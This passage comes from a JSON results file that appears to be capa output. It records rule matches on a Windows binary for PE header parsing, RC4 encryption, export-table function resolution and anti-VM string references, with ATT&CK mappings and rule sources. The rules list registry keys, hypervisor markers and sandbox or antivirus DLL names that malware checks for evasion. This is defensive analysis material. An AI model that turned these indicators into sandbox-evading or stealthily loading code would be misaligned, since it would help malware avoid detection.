                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "mnemonic",
                          "mnemonic": "cmp"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442465459
                        },
                        {
                          "type": "absolute",
                          "value": 6442465478
                        },
                        {
                          "type": "absolute",
                          "value": 6442465438
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 17744,
                              "description": "IMAGE_NT_SIGNATURE (PE)"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442465478
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 80
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 69
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 23117,
                              "description": "IMAGE_DOS_SIGNATURE (MZ)"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442465459
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 77
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 90
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand offset",
                                  "index": 1,
                                  "operand_offset": 60,
                                  "description": "IMAGE_DOS_HEADER.e_lfanew"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 6442465474
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "i386"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 80,
                                          "description": "IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 52,
                                          "description": "IMAGE_NT_HEADERS.OptionalHeader.ImageBase"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "amd64"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "no address"
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 80,
                                          "description": "IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 48,
                                          "description": "IMAGE_NT_HEADERS64.OptionalHeader.ImageBase"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "parse PE header/95af70cf6fb0482ab5ddecde71e3b40a"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "encrypt data using RC4 PRGA": {
        "meta": {
          "name": "encrypt data using RC4 PRGA",
          "namespace": "data-manipulation/encryption/rc4",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [
            {
              "parts": [
                "Defense Evasion",
                "Obfuscated Files or Information"
              ],
              "tactic": "Defense Evasion",
              "technique": "Obfuscated Files or Information",
              "subtechnique": "",
              "id": "T1027"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Cryptography",
                "Encrypt Data",
                "RC4"
              ],
              "objective": "Cryptography",
              "behavior": "Encrypt Data",
              "method": "RC4",
              "id": "C0027.009"
            },
            {
              "parts": [
                "Cryptography",
                "Generate Pseudo-random Sequence",
                "RC4 PRGA"
              ],
              "objective": "Cryptography",
              "behavior": "Generate Pseudo-random Sequence",
              "method": "RC4 PRGA",
              "id": "C0021.004"
            }
          ],
          "references": [],
          "examples": [
            "34404A3FB9804977C6AB86CB991FB130:0x403DB0",
            "34404A3FB9804977C6AB86CB991FB130:0x403E50",
            "9324D1A8AE37A36AE560C37448C9705A:0x4049F0",
            "73CE04892E5F39EC82B00C02FC04C70F:0x4064C6"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: encrypt data using RC4 PRGA\r\n    namespace: data-manipulation/encryption/rc4\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported  # requires characteristic, mnemonic, basicblock features\r\n    att&ck:\r\n      - Defense Evasion::Obfuscated Files or Information [T1027]\r\n    mbc:\r\n      - Cryptography::Encrypt Data::RC4 [C0027.009]\r\n      - Cryptography::Generate Pseudo-random Sequence::RC4 PRGA [C0021.004]\r\n    examples:\r\n      - 34404A3FB9804977C6AB86CB991FB130:0x403DB0\r\n      - 34404A3FB9804977C6AB86CB991FB130:0x403E50\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x4049F0\r\n      - 73CE04892E5F39EC82B00C02FC04C70F:0x4064C6\r\n  features:\r\n    - and:\r\n      # TODO: maybe add characteristic for nzxor reg size\r\n      - count(characteristic(nzxor)): 1\r\n      - or:\r\n        - match: calculate modulo 256 via x86 assembly\r\n        # compiler may do this via zero-extended mov from 8-bit register\r\n        - count(mnemonic(movzx)): 4 or more\r\n      # should not call (many) functions\r\n      - count(characteristic(calls from)): (0, 4)\r\n      # should not be too simple or too complex (50 is picked by intuition)\r\n      - count(basic blocks): (4, 50)\r\n      - match: contain loop\r\n      - optional:\r\n        - or:\r\n          - number: 0xFF\r\n          - number: 0x100\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442465550
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "contain loop"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "characteristic",
                              "characteristic": "loop"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442465550
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "characteristic",
                              "characteristic": "tight loop"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "characteristic",
                              "characteristic": "recursive call"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442465550
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 1,
                      "max": 1,
                      "child": {
                        "type": "characteristic",
                        "characteristic": "nzxor"
                      }
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442465899
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 0,
                      "max": 4,
                      "child": {
                        "type": "characteristic",
                        "characteristic": "calls from"
                      }
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 4,
                      "max": 50,
                      "child": {
                        "type": "basic block"
                      }
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442465648
                    },
                    {
                      "type": "absolute",
                      "value": 6442465977
                    },
                    {
                      "type": "absolute",
                      "value": 6442465687
                    },
                    {
                      "type": "absolute",
                      "value": 6442465929
                    },
                    {
                      "type": "absolute",
                      "value": 6442465550
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "calculate modulo 256 via x86 assembly"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "arch",
                                      "arch": "i386"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "arch",
                                      "arch": "amd64"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "no address"
                                    }
                                  ],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "and"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 6442465853
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 2147483903
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 255
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442465853
                                    }
                                  ],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442465853
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "range",
                          "min": 4,
                          "max": 9223372036854775808,
                          "child": {
                            "type": "mnemonic",
                            "mnemonic": "movzx"
                          }
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 255
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442465853
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 256
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442465701
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "resolve function by parsing PE exports": {
        "meta": {
          "name": "resolve function by parsing PE exports",
          "namespace": "load-code/pe",
          "authors": [
            "sara-rn"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [],
          "mbc": [],
          "references": [],
          "examples": [
            "73CE04892E5F39EC82B00C02FC04C70F:0x406BA1"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: resolve function by parsing PE exports\r\n    namespace: load-code/pe\r\n    authors:\r\n      - sara-rn\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported  # requires characteristic, offset, mnemonic features\r\n    examples:\r\n      - 73CE04892E5F39EC82B00C02FC04C70F:0x406BA1\r\n  features:\r\n    - and:\r\n      - os: windows\r\n      - or:\r\n        - characteristic: loop\r\n        - mnemonic: movzx\r\n      - and:\r\n        - offset: 0x3C = IMAGE_DOS_HEADER.PE.e_lfanew\r\n        - or:\r\n          - and:\r\n            - arch: i386\r\n            - offset: 0x78 = offset to IMAGE_DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_EXPORT]\r\n          - and:\r\n            - arch: amd64\r\n            - offset: 0x88 = offset to IMAGE_DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_EXPORT]\r\n        - 3 or more:\r\n          - offset: 0x14 = IMAGE_EXPORT_DIRECTORY.NumberOfFunctions\r\n          - offset: 0x24 = IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals\r\n          - offset: 0x20 = IMAGE_EXPORT_DIRECTORY.AddressOfNames\r\n          - offset: 0x18 = IMAGE_EXPORT_DIRECTORY.NumberOfNames\r\n          - offset: 0x1C = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions\r\n      - optional:\r\n        - or:\r\n          - api: LoadLibrary\r\n          - api: strcmp\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442466743
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "loop"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442466743
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "mnemonic",
                          "mnemonic": "movzx"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442467305
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "LoadLibrary"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "strcmp"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "offset",
                          "offset": 60,
                          "description": "IMAGE_DOS_HEADER.PE.e_lfanew"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442466772
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "arch",
                                  "arch": "i386"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "offset",
                                  "offset": 120,
                                  "description": "offset to IMAGE_DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_EXPORT]"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "arch",
                                  "arch": "amd64"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "no address"
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "offset",
                                  "offset": 136,
                                  "description": "offset to IMAGE_DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_EXPORT]"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 6442466809
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "some",
                          "count": 3
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 20,
                              "description": "IMAGE_EXPORT_DIRECTORY.NumberOfFunctions"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 36,
                              "description": "IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442466887
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 32,
                              "description": "IMAGE_EXPORT_DIRECTORY.AddressOfNames"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442466819
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 24,
                              "description": "IMAGE_EXPORT_DIRECTORY.NumberOfNames"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442466843
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 28,
                              "description": "IMAGE_EXPORT_DIRECTORY.AddressOfFunctions"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442467294
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "reference anti-VM strings": {
        "meta": {
          "name": "reference anti-VM strings",
          "namespace": "anti-analysis/anti-vm/vm-detection",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "file",
            "dynamic": "file"
          },
          "attack": [
            {
              "parts": [
                "Defense Evasion",
                "Virtualization/Sandbox Evasion",
                "System Checks"
              ],
              "tactic": "Defense Evasion",
              "technique": "Virtualization/Sandbox Evasion",
              "subtechnique": "System Checks",
              "id": "T1497.001"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Anti-Behavioral Analysis",
                "Virtual Machine Detection"
              ],
              "objective": "Anti-Behavioral Analysis",
              "behavior": "Virtual Machine Detection",
              "method": "",
              "id": "B0009"
            }
          ],
          "references": [
            "https://github.com/ctxis/CAPE/blob/master/modules/signatures/antivm_*",
            "https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiVM/Generic.cpp"
          ],
          "examples": [
            "Practical Malware Analysis Lab 17-02.dll_"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: reference anti-VM strings\r\n    namespace: anti-analysis/anti-vm/vm-detection\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: file\r\n      dynamic: file\r\n    att&ck:\r\n      - Defense Evasion::Virtualization/Sandbox Evasion::System Checks [T1497.001]\r\n    mbc:\r\n      - Anti-Behavioral Analysis::Virtual Machine Detection [B0009]\r\n    references:\r\n      - https://github.com/ctxis/CAPE/blob/master/modules/signatures/antivm_*\r\n      - https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiVM/Generic.cpp\r\n    examples:\r\n      - Practical Malware Analysis Lab 17-02.dll_\r\n  features:\r\n    - or:\r\n      - string: /HARDWARE\\\\ACPI\\\\(DSDT|FADT|RSDT)\\\\BOCHS/i\r\n      - string: /HARDWARE\\\\DESCRIPTION\\\\System\\\\(SystemBiosVersion|VideoBiosVersion)/i\r\n      - string: /HARDWARE\\\\DESCRIPTION\\\\System\\\\CentralProcessor/i\r\n      - string: /HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi Port 0\\\\Scsi Bus 0\\\\Target Id 0\\\\Logical Unit Id 0/i\r\n      - string: /SYSTEM\\\\(ControlSet\\d{3}|CurrentControlSet)\\\\Enum\\\\IDE/i\r\n      - string: /SYSTEM\\\\(ControlSet\\d{3}|CurrentControlSet)\\\\Services\\\\Disk\\\\Enum\\\\/i\r\n      - string: /SYSTEM\\\\(ControlSet\\d{3}|CurrentControlSet)\\\\Control\\\\SystemInformation\\\\SystemManufacturer/i\r\n      - string: /A M I/i\r\n      - string: /Hyper-V/i\r\n      - string: /Kernel-VMDetection-Private/i\r\n      # https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiVM/Generic.cpp#L699\r\n      - string: /KVMKVMKVM/i\r\n        description: KVM\r\n      - string: /Microsoft Hv/i\r\n        description: Microsoft Hyper-V or Windows Virtual PC\r\n      # https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiVM/Generic.cpp#L8\r\n      - string: /avghookx\\.dll/i\r\n        description: AVG\r\n      - string: /avghooka\\.dll/i\r\n        description: AVG\r\n      - string: /snxhk\\.dll/i\r\n        description: Avast\r\n      - string: /pstorec\\.dll/i\r\n        description: SunBelt Sandbox\r\n      - string: /vmcheck\\.dll/i\r\n        description: Virtual PC\r\n      - string: /wpespy\\.dll/i\r\n        description: WPE Pro\r\n      - string: /cmdvrt64\\.dll/i\r\n        description: Comodo Container\r\n      - string: /cmdvrt32\\.dll/i\r\n        description: Comodo Container\r\n      # https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiVM/Generic.cpp#L46\r\n      - string: /sample\\.exe/i\r\n      - string: /bot\\.exe/i\r\n      - string: /sandbox\\.exe/i\r\n      - string: /malware\\.exe/i\r\n      - string: /test\\.exe/i\r\n      - string: /klavme\\.exe/i\r\n      - string: /myapp\\.exe/i\r\n      - string: /testapp\\.exe/i\r\n",
        "matches": [
          [
            {
              "type": "no address"
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/HARDWARE\\\\ACPI\\\\(DSDT|FADT|RSDT)\\\\BOCHS/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/HARDWARE\\\\DESCRIPTION\\\\System\\\\(SystemBiosVersion|VideoBiosVersion)/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/HARDWARE\\\\DESCRIPTION\\\\System\\\\CentralProcessor/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi Port 0\\\\Scsi Bus 0\\\\Target Id 0\\\\Logical Unit Id 0/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/SYSTEM\\\\(ControlSet\\d{3}|CurrentControlSet)\\\\Enum\\\\IDE/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/SYSTEM\\\\(ControlSet\\d{3}|CurrentControlSet)\\\\Services\\\\Disk\\\\Enum\\\\/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/SYSTEM\\\\(ControlSet\\d{3}|CurrentControlSet)\\\\Control\\\\SystemInformation\\\\SystemManufacturer/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/A M I/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/Hyper-V/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/Kernel-VMDetection-Private/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/KVMKVMKVM/i",
                      "description": "KVM"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/Microsoft Hv/i",
                      "description": "Microsoft Hyper-V or Windows Virtual PC"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/avghookx\\.dll/i",
